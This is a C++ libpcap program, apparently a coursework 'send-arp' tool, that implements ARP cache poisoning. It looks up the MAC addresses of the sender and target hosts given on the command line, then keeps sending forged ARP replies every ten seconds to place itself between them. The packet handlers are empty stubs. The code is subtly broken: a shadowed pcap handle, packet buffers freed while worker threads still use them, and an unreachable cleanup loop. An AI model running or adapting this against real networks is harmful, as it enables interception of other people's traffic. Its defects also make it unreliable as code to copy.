#define core_num 4
#include <iostream>
#include <string>
#include <stdint.h>
#include <cstring>
#include <pcap.h>
#include <ctype.h>
#include <unistd.h>
#include "proto_structures.h"
#include "local_address.h"
#include <map>
#include <set>
#include <utility>
#include <vector>
#include <pthread.h>
#include <semaphore.h>

std::map<uint32_t,mac_addr> ip_to_mac;
std::map<uint32_t,std::set<uint32_t>> s2t;
std::map<uint32_t,std::set<uint32_t>> t2s;

std::vector<int> proc_manage;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
sem_t sem;

pcap_t* ohandle;
pthread_mutex_t omutex = PTHREAD_MUTEX_INITIALIZER;

ipv4_addr my_ip;
mac_addr my_mac;

void add_ip(const ipv4_addr& ip,pcap_t* handle){
	for(;;){
		arp_eth_ipv4 packet(my_mac,my_ip,ip);
		pcap_sendpacket(handle,packet,sizeof packet);
		pcap_pkthdr* hdr;
		const uint8_t* ptr;
		if(!pcap_next_ex(handle,&hdr,&ptr)){
			printf("arp no reply\n");
			exit(1);
		}
		memcpy(&packet,ptr,sizeof packet);
		if(packet.sip.word==ip.word&&packet.arptype==htons(0x0002)){
			ip_to_mac[ip.word]=packet.smac;
			return;
		}
	}
}

void arp_poison(const ipv4_addr& sip,const ipv4_addr& tip){
	mac_addr smac=ip_to_mac[sip.word];
	arp_eth_ipv4 packet(my_mac,smac,tip,sip);
	pthread_mutex_lock(&omutex);
	pcap_sendpacket(ohandle,packet,sizeof packet);
	pthread_mutex_unlock(&omutex);
}
void arp_recover(const ipv4_addr& sip,const ipv4_addr& tip){
	mac_addr smac=ip_to_mac[sip.word];
	mac_addr tmac=ip_to_mac[tip.word];
	arp_eth_ipv4 packet(tmac,smac,tip,sip);packet.src=my_mac;
	pthread_mutex_lock(&omutex);
	pcap_sendpacket(ohandle,packet,sizeof packet);
	pthread_mutex_unlock(&omutex);
}

void process_arp(arp_eth_ipv4* packet){
	
}

void process_ip(ipv4_eth* packet){
}

void* process_packet(void* param){
	int idx = 0[(uint32_t*)param];
	int len = 1[(uint32_t*)param];
	arp_eth_ipv4* arp=(arp_eth_ipv4*)(8+(uint8_t*)param);
	if(arp->is_valid()){
		process_arp(arp);
	}
	else{
		ipv4_eth* ipv4=(ipv4_eth*)(8+(uint8_t*)param);
		if(ipv4->is_valid()){
			process_ip(ipv4);
		}
		//nothing to do when it is neither ipv4 nor arp
	}
	
	pthread_mutex_lock(&mutex);
	proc_manage.push_back(idx);
	pthread_mutex_unlock(&mutex);
	sem_post(&sem);
	return nullptr;
}

void* continue_poisoning(void* param){
	auto& stpairs=*(std::vector<std::pair<ipv4_addr,ipv4_addr>>*)param;
	for(;;){
		for(auto&[s,t]:stpairs)
			arp_poison(s,t);
		
		sleep(10);
	}
	for(auto&[s,t]:stpairs)
		arp_recover(s,t);
	return nullptr;
}

int main(int c,char **v){
	if(c&1){
		printf("syntex : send-arp <interface> <sender ip> <target ip> ...\n");
		return 1;
	}
	char errbuf[PCAP_ERRBUF_SIZE];
	my_mac=get_mac_addr(v[1]);
	my_ip=get_ipv4_addr(v[1]);
	
	std::vector<std::pair<ipv4_addr,ipv4_addr>> stpairs;
	for(int i=2;i<c;i+=2){
		ipv4_addr s(v[i]);
		ipv4_addr t(v[i+1]);
		stpairs.emplace_back(s,t);
		s2t[s.word].insert(t.word);
		t2s[t.word].insert(s.word);
	}
	pcap_t* handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	pcap_t* ohandle=pcap_open_live(v[1],0,0,0,errbuf);
	if(ohandle==nullptr){
		printf("pcap error : %s\n",errbuf);
		exit(1);
	}
	for(int i=2;i<c;i++)
		add_ip(v[i],handle);
	pthread_t th[core_num];
	int usedth[core_num]={0};
	void * nevermind;
	for(int i=1;i<core_num;i++)
		proc_manage.push_back(i);
	sem_init(&sem, 0, core_num-1);
	pthread_create(th,NULL,continue_poisoning,&stpairs);
	
	for(;;){
		pcap_pkthdr* hdr;
		const uint8_t* ptr;
		if(!pcap_next_ex(handle,&hdr,&ptr)){
			printf("pcap listing failed\n");
			exit(1);
		}
		sem_wait(&sem);
		pthread_mutex_lock(&mutex);
		int idx=proc_manage.back();proc_manage.pop_back();
		pthread_mutex_unlock(&mutex);
		int len=hdr->caplen;
		uint8_t* packet=(uint8_t*)malloc(len+8);
		memcpy(packet+8,ptr,len);
		0[(uint32_t*)packet]=idx;
		1[(uint32_t*)packet]=len;
		
		if(usedth[idx])
			pthread_join(th[idx], &nevermind);
		else usedth[idx]=1;
		pthread_create(th+idx,NULL,process_packet,packet);
		
		free(packet);
	}
	
	sem_destroy(&sem);
	pthread_join(th[0], &nevermind);
	for(int i=0;i<core_num;i++)
		if(usedth[i])
			pthread_join(th[i], &nevermind);
	pcap_close(handle);
	pcap_close(ohandle);
	return 0;
}
